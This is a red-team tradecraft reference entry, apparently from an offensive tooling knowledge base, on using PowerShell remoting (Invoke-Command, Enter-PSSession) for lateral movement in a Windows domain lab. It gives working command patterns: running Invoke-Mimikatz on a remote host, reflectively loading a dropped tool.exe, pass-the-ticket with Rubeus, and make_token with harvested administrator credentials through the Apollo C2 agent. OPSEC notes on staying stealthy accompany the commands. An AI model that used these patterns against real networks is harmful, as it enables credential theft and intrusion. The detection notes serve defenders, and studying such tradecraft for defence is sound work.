---
name: SharpRemoteManagement / Remote Administration Tools
category: lateral-movement
subcategories: [remote-admin, winrm-pssession, invoke-command, legitimate-remoting]
tradecraft_tags: [winrm, pssession, powershell-remoting, invoke-command, lateral-movement, legitimate, built-in]
mitre_attack:
  - id: T1021.006
    name: Remote Services — Windows Remote Management
source:
  url: https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/running-remote-commands
  license: none
  maintained: false
binary_type: none
binary_filename: ""
supported_os: [windows]
architecture: [x64]
privilege_required: local-admin
network_required: true
detection_signal: |
  PowerShell remoting via Invoke-Command/Enter-PSSession generates Event 4624 (type 3
  network logon) and wsmprovhost.exe process creation on the target. WinRM connections
  from unusual source IPs are detectable. PowerShell remoting is legitimately used for
  IT administration — blends better than explicit lateral movement tools in environments
  where it's common.
usage_examples:
  - description: Execute a command on a remote host via PS remoting (current credentials)
    args: "Invoke-Command -ComputerName WINTERFELL -ScriptBlock { whoami }"
  - description: Execute with alternate credentials
    args: "$cred = New-Object System.Management.Automation.PSCredential('NORTH\\administrator', (ConvertTo-SecureString 'Password123' -AsPlainText -Force)); Invoke-Command -ComputerName WINTERFELL -Credential $cred -ScriptBlock { whoami }"
  - description: Interactive PS session
    args: "Enter-PSSession -ComputerName WINTERFELL"
  - description: Execute using existing Kerberos ticket (no explicit creds)
    args: "Invoke-Command -ComputerName WINTERFELL -ScriptBlock { whoami }"
opsec_notes: |
  PowerShell remoting uses the existing user's Kerberos ticket or NTLM credentials —
  no new credential material needed if the current session already has domain creds.
  After PTT (Rubeus ptt or Apollo ticket_cache_add), Invoke-Command automatically
  uses the injected ticket. This is the stealthiest lateral movement via PowerShell:
  no new tool binary, uses built-in Windows remoting, legitimate admin traffic.
  Apollo's powershell_import executes in the same PS context — a loaded Invoke-Command
  chain runs without additional tooling.
gotchas: |
  WinRM must be enabled on the target. PowerShell remoting uses TCP 5985 (HTTP) or
  5986 (HTTPS). The target must have WSManCredSSP or Kerberos/NTLM authentication
  configured. DOUBLE HOP problem: Invoke-Command can't re-authenticate to a third host
  using the second host's credentials (the Kerberos delegation problem) — use CredSSP
  or explicit credential passing for multi-hop remoting.
related_ttps: [evil-winrm, sharpexec, pass-the-ticket, rubeus]
alternatives: [evil-winrm, sharpexec-winrm, crackmapexec-winrm]
common_args: {}
last_updated: 2026-05-29
---

# PowerShell Remoting for Lateral Movement

Built-in Windows PowerShell remoting (`Invoke-Command`, `Enter-PSSession`) provides
the cleanest possible lateral movement when WinRM is enabled and appropriate credentials
are held. No additional tools needed — uses Windows' own remote management infrastructure.

## Stealthy Lateral Movement Pattern

```powershell
# Pattern 1: Use existing Kerberos ticket (injected via Rubeus ptt)
# After: Rubeus.exe ptt /ticket:<DA-TGT>
Invoke-Command -ComputerName WINTERFELL -ScriptBlock { whoami; hostname }

# Pattern 2: Explicit credentials (harvested hash → make_token → PS remoting)
# Apollo: make_token /domain:NORTH /user:administrator /password:Password123
Invoke-Command -ComputerName WINTERFELL -ScriptBlock { Invoke-Mimikatz }

# Pattern 3: Load a tool and execute remotely
$tools_path = "\\\\WINTERFELL\C$\Windows\Temp\"
Invoke-Command -ComputerName WINTERFELL -ScriptBlock {
    [System.Reflection.Assembly]::LoadFrom("C:\Windows\Temp\tool.exe").EntryPoint.Invoke($null, $null)
}
```

## The Double-Hop Problem

```
Machine A (attacker) → Machine B (WinRM) → Machine C (target share)
                       ^ Your creds stop here

Workaround options:
1. CredSSP (sends credentials to B, allowing re-auth to C) — credential exposure risk
2. Explicit -Credential on nested Invoke-Command (pass creds explicitly)
3. Kerberos delegation (constrained or unconstrained) on Machine B
4. Create a PSSession from A to C directly (skip B as intermediary)
```

## Via Apollo powershell_import

If PowerView or other PS tools are loaded via Apollo's powershell_import:
```
Apollo: powershell_import PowerView.ps1
# Then directly use PS remoting cmdlets from within the loaded module context:
Invoke-Command -ComputerName WINTERFELL -ScriptBlock { Get-NetLocalGroupMember -Group Administrators }
```
